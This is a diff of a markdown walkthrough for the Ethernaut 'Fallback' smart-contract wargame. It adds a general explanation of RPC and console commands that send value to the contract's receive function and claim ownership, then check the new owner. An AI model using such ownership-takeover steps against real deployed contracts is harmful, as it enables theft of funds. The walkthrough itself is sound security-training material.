@@ -87,11 +87,19 @@ length: 2
 ```
 ### JSON RPC ETH
 
-<img src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Fallback/img/"jsonrpc.png">
+One way to call receive function is send external value to contract with console.Part of understanding “what is JSON-RPC” is understanding RPC itself. The concept of a remote procedure call, or RPC, in distributed computing refers to the process by which a computer program causes the execution of a subroutine or a procedure in a different location, known as an address space. Such remote address spaces in distributed computing refer to other computers in a network.
+
+RPCs are coded as though they were just local procedure calls. In other words, a programmer will code the same thing even if the subroutine was meant to be local or remote. There is no distinguishable difference in coding for both local and remote interactions, and the programmer does not need to explicitly indicate that such a procedure call is to be run locally or remotely.
+
+<img src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Fallback/img/jsonrpc.png">
+
+For the call receiving function, we use JSON RPC with the ``sendTransaction()`` method and enter the value that will make us the owner of the contract.
 
 ```shell
 await contract.sendTransaction({value: 1})
 ```
+Check owner.
+
 ```shell
 await contract.owner()
 "0x0C39eb3D6C0583AdA92e15C9e7610B609BBdF35b"
